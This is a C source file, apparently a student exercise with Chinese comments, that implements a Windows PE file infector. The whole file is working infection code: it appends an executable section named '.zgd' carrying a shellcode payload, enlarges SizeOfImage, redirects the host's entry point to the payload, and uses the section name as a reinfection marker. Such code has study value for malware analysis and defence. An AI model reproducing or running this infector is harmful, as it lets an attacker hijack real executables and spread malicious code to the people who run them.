#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <tchar.h> 


// 获取PE文件的e_lfanew和IMAGE_FILE_HEADER
int get_image_file_header(const char* pe_filepath, LONG* e_lfanew, IMAGE_FILE_HEADER* fileHeader) {

    //打开文件
    HANDLE peFile = CreateFileA(pe_filepath, GENERIC_READ, FILE_SHARE_READ, \
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (peFile == INVALID_HANDLE_VALUE) {
        perror("File open error");
        return -1;
    }

    //读取dos头的e_lfanew
    IMAGE_DOS_HEADER dosHeader;
    DWORD bytesRead; //读取的字节数
    if (!ReadFile(peFile, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_DOS_HEADER)) {
        perror("Read dos error");
        CloseHandle(peFile);
        return -1;
    }
    *e_lfanew = dosHeader.e_lfanew;

    //e_lfanew + ‘PE00’将文件指针移动到IMAGE_FILE_HEADER
    SetFilePointer(peFile, (*e_lfanew) + 4, NULL, FILE_BEGIN);

    //读取内容
    if (!ReadFile(peFile, fileHeader, sizeof(IMAGE_FILE_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_FILE_HEADER)) {
        perror("Read fileHeader error");
        CloseHandle(peFile);
        return -1;
    }

    CloseHandle(peFile);
    return 0;
}


// 获取病毒节表项的插入位置
DWORD get_virus_section_header_place(LONG e_lfanew, IMAGE_FILE_HEADER fileHeader) {
    
    //病毒节表项偏移 = ‘DOS头’ + ‘PE00’ + ‘FileHeader’ + ‘OptionalHeader’ + NumberOfSections*sizeofSectionHeader
    DWORD offset = e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + fileHeader.SizeOfOptionalHeader \
    + sizeof(IMAGE_SECTION_HEADER) * (fileHeader.NumberOfSections);

    return offset;
}


// 获取病毒节的PointerToRawData和VirtualAddress
int get_virus_section_info(
    const char* pe_filepath, LONG e_lfanew, IMAGE_FILE_HEADER fileHeader, 
    DWORD* virus_PointerToRawData, DWORD* virus_VirtualAddress
) {

    //计算最后一个节表项的位置
    DWORD last_section_offset = e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + fileHeader.SizeOfOptionalHeader \
    + sizeof(IMAGE_SECTION_HEADER) * (fileHeader.NumberOfSections - 1);

    HANDLE peFile = CreateFileA(pe_filepath, GENERIC_READ, FILE_SHARE_READ, \
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (peFile == INVALID_HANDLE_VALUE) {
        perror("File open error");
        return -1;
    }

    //将文件句柄移动到最后一个节表项位置
    SetFilePointer(peFile, last_section_offset, NULL, FILE_BEGIN);

    //读取内容
    DWORD bytesRead;
    IMAGE_SECTION_HEADER last_section_header = {0};
    if (!ReadFile(peFile, &last_section_header, sizeof(IMAGE_SECTION_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_SECTION_HEADER)) {
        perror("Read error");
        CloseHandle(peFile);
        return -1;
    }

    //计算病毒节的PointerToRawData
    *virus_PointerToRawData = last_section_header.PointerToRawData + last_section_header.SizeOfRawData;

    //计算病毒节的VirtualAddress, 注意SectionAlignment对齐
    *virus_VirtualAddress = last_section_header.VirtualAddress + \
                            ((last_section_header.Misc.VirtualSize + 4095) / 4096) * 4096;
    
    CloseHandle(peFile);
    return 0;
}


//保存PE文件的AddressOfentryPoint，篡改病毒入口和SizeOfImage(这一点老师的ppt没说但是是要修改的，不然virus的VA会被invalid)
int get_address_of_entrypoint(
    const char* pe_filepath, const char* virus_path, 
    LONG e_lfanew, DWORD* AddressOfentryPoint, DWORD virus_VirtualAddress
) {
    //以可写可读的方式打开文件
    HANDLE peFile = CreateFileA(pe_filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, \
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (peFile == INVALID_HANDLE_VALUE) {
        perror("File open error");
        return -1;
    }

    //将文件句柄移动到IMAGE_OPTIONAL_HEADER
    SetFilePointer(peFile, e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER), NULL, FILE_BEGIN);

    //读取文件OPTIONAL_HEADER内容
    DWORD bytesRead;
    IMAGE_OPTIONAL_HEADER32 temp = { 0 };
    if (!ReadFile(peFile, &temp, sizeof(IMAGE_OPTIONAL_HEADER32), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_OPTIONAL_HEADER32)) {
        perror("Read AddressOfentryPoint error!");
        CloseHandle(peFile);
        return -1;
    }

    //保存原入口代码地址(RVA)
    *AddressOfentryPoint = temp.AddressOfEntryPoint;

    //打开病毒载荷
    HANDLE VirusFile = CreateFileA(virus_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,\
                                 FILE_ATTRIBUTE_NORMAL, NULL);
    if (VirusFile == INVALID_HANDLE_VALUE) {
        perror("Failed to open binary file.");
        CloseHandle(VirusFile);
        return -1;
    }

    //获取病毒载荷的大小
    DWORD VirusSize = GetFileSize(VirusFile, NULL);

    //篡改入口地址和SizeOfImage
    temp.AddressOfEntryPoint = virus_VirtualAddress;
    temp.SizeOfImage = temp.SizeOfImage + VirusSize;
    SetFilePointer(peFile, e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER), NULL, FILE_BEGIN);
    if (!WriteFile(peFile, &temp, sizeof(IMAGE_OPTIONAL_HEADER32), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_OPTIONAL_HEADER32)) {
        perror("AddressOfEntryPoint Write error!");
        CloseHandle(peFile);
        return -1;
    }
    CloseHandle(peFile);
    CloseHandle(VirusFile);
    return 0;
}



// 插入病毒的节表项和节表
int insert_new_section(const char* pe_filepath, const char* virus_path, LONG e_lfanew, DWORD virus_section_header_place, \
                        DWORD virus_PointerToRawData, DWORD virus_VirtualAddress, IMAGE_FILE_HEADER* fileHeader) {

//----------------修改目标文件的IMAGE_FILE_HEADER-----------------//
    //打开宿主文件
    HANDLE peFile = CreateFileA(pe_filepath, GENERIC_READ | GENERIC_WRITE, \
                            FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (peFile == INVALID_HANDLE_VALUE) {
        perror("File open error");
        return -1;
    }

    // 移动文件指针到IMAGE_FILE_HEADER的起始位置
    DWORD offset = e_lfanew + 4;
    SetFilePointer(peFile, offset, NULL, FILE_BEGIN);

    // 修改文件中的NumberOfSections值(加1)
    (*fileHeader).NumberOfSections++;
    DWORD bytesRead;
    if (!WriteFile(peFile, fileHeader, sizeof(IMAGE_FILE_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_FILE_HEADER)) {
        perror("NumberOfSection Write error");
        CloseHandle(peFile);
        return -1;
    }

//----------------------插入病毒的节表项----------------------//
    //考虑FileAlignment判断是否有足够空间插入病毒的节表项
    DWORD file_alignment = 512;
    if (((virus_section_header_place % file_alignment) + sizeof(IMAGE_SECTION_HEADER) > file_alignment) \
        || (virus_section_header_place % file_alignment == 0)) {
        //空间不足返回无法插入
        printf("virus_section_header cannot find enough place!");
        return -1;
    }

    //打开病毒载荷句柄
    HANDLE VirusFile = CreateFileA(virus_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,\
                                 FILE_ATTRIBUTE_NORMAL, NULL);
    if (VirusFile == INVALID_HANDLE_VALUE) {
        perror("Failed to open binary file.");
        CloseHandle(VirusFile);
        return -1;
    }

    //获取病毒载荷的大小
    DWORD VirusSize = GetFileSize(VirusFile, NULL);
    printf("virusSize: 0x%X\n", VirusSize);

    //创建病毒的节表项
    IMAGE_SECTION_HEADER VirusSection = { 0 };
    const char* virusname = ".zgd";
    //添加节表项的名称，作为传染的标志(避免重复传染)
    strncpy((char*)VirusSection.Name, virusname, IMAGE_SIZEOF_SHORT_NAME);
    VirusSection.Misc.VirtualSize = VirusSize;
    VirusSection.VirtualAddress = virus_VirtualAddress;
    VirusSection.PointerToRawData = virus_PointerToRawData;
    VirusSection.SizeOfRawData = ((VirusSize + 511) / 512) * 512;
    VirusSection.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    //插入病毒的节表项
    SetFilePointer(peFile, virus_section_header_place, NULL, FILE_BEGIN);
    if (!WriteFile(peFile, &VirusSection, sizeof(IMAGE_SECTION_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_SECTION_HEADER)) {
        perror("virus_Section_Header Write error");
        CloseHandle(peFile);
        return -1;
    } else {
        printf("virus_section_header success!\n");
    }

//--------------------插入病毒节------------------------//
    //将文件句柄移动到病毒节的插入位置
    SetFilePointer(peFile, virus_PointerToRawData, NULL, FILE_BEGIN);

    BYTE buffer[1024];  // 用于读取和写入数据的缓冲区,由病毒载荷的大小决定
    DWORD bufferSize = 1024;
    // 从病毒载荷中读取数据并插入
    while (ReadFile(VirusFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(peFile, buffer, bytesRead, NULL, NULL)) {
            perror("Write VirusSection error");
            break;
        }
    }

//-------------关闭打开的文件句柄, 病毒载荷植入完毕--------------//
    CloseHandle(VirusFile);
    CloseHandle(peFile);
    return 0;
}


//判断宿主程序是否已经被传染
BOOL is_infect(const char* pe_filepath, LONG e_lfanew, IMAGE_FILE_HEADER fileHeader) {
    //打开宿主文件
    HANDLE peFile = CreateFileA(pe_filepath, GENERIC_READ | GENERIC_WRITE, \
                            FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (peFile == INVALID_HANDLE_VALUE) {
        perror("File open error");
        return -1;
    }

    //病毒节表项偏移 = ‘DOS头’ + ‘PE00’ + ‘FileHeader’ + ‘OptionalHeader’ + (NumberOfSections-1)*sizeofSectionHeader
    DWORD offset = e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + fileHeader.SizeOfOptionalHeader \
    + sizeof(IMAGE_SECTION_HEADER) * (fileHeader.NumberOfSections - 1);

    //将文件句柄移动到最后病毒节表项位置
    SetFilePointer(peFile, offset, NULL, FILE_BEGIN);

    //读取病毒节内容
    DWORD bytesRead;
    IMAGE_SECTION_HEADER virus_section_header = {0};
    if (!ReadFile(peFile, &virus_section_header, sizeof(IMAGE_SECTION_HEADER), &bytesRead, NULL) \
    || bytesRead != sizeof(IMAGE_SECTION_HEADER)) {
        perror("Read error");
        CloseHandle(peFile);
        return -1;
    }
    CloseHandle(peFile);

    const char* flag = ".zgd";
    const char* str = (const char*)virus_section_header.Name;
    if(!strcmp(str, flag)) {
        //如果已经被传染过
        return false;
    } else {
        return true;
    }
}



int main(){
    //获取目标程序路径
    const char* pe_filepath = "D:/Code/c_code/PE_virus_proc/test.exe";
    
    //获取e_lfanew和FileHeader
    IMAGE_FILE_HEADER file_header;
    LONG e_lfanew;
    if (get_image_file_header(pe_filepath, &e_lfanew, &file_header) == 0) {
        printf("e_lfanew: 0x%X\n", e_lfanew);
        printf("NumberOfSections: %u\n", file_header.NumberOfSections);
        printf("SizeOfOptionalHeader: 0x%X\n", file_header.SizeOfOptionalHeader);
    }

    //计算病毒节表项的插入位置
    DWORD virus_section_header_place = get_virus_section_header_place(e_lfanew, file_header);
    printf("virus_section_header_place: 0x%X\n", virus_section_header_place);

    //计算病毒节的PointerToRawData和VirtualAddress
    DWORD virus_PointerToRawData = 0;
    DWORD virus_VirtualAddress = 0;
    if(get_virus_section_info(pe_filepath, e_lfanew, file_header, &virus_PointerToRawData, \
        &virus_VirtualAddress) != 0) {
        printf("get_virus_section_info error!");
    } else {
        printf("virus_PointerToRawData: 0x%X\n", virus_PointerToRawData);
        printf("virus_VirtualAddress: 0x%X\n", virus_VirtualAddress);
    }

    //避免重复传染
    if(is_infect(pe_filepath, e_lfanew, file_header)) {
        //篡改AddressOfentryPoint和SizeOfImage
        const char* virus_path = "D:/Code/c_code/PE_virus_proc/shellcode.exe[.virus]";
        DWORD pe_AddressOfentryPoint = 0;
        if(get_address_of_entrypoint(pe_filepath, virus_path, e_lfanew, &pe_AddressOfentryPoint, virus_VirtualAddress) != 0) {
            printf("get_address_of_entrypoint error!");
        } else {
            printf("pe_AddressOfentryPoint: 0x%X\n", pe_AddressOfentryPoint);
        }

        //插入病毒的节表项和节表
        if(insert_new_section(pe_filepath, virus_path, e_lfanew, virus_section_header_place, \
                            virus_PointerToRawData, virus_VirtualAddress, &file_header) != 0) {
            printf("insert_new_section error!");
        } else {
            printf("everything seccess!");
        }
        return 0;
    } else {
        printf("This peFile has been infected!\n");
        return 0;
    }
    
}


